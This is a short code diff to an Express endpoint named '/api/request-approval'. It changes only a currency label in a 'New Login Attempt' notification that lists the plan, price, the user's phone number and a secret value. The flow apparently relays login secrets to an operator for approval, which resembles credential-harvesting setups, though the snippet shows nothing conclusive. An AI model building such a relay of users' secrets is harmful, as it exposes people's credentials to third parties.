@@ -91,7 +91,7 @@ app.post('/api/request-approval', async (req, res) => {
     const text =
       `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
       `📦 Plan: ${plan || '—'}\n` +
-      `💰 Price: MK ${price || '—'}\n` +
+      `💰 Price: K${price || '—'}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
       secretLine;
       
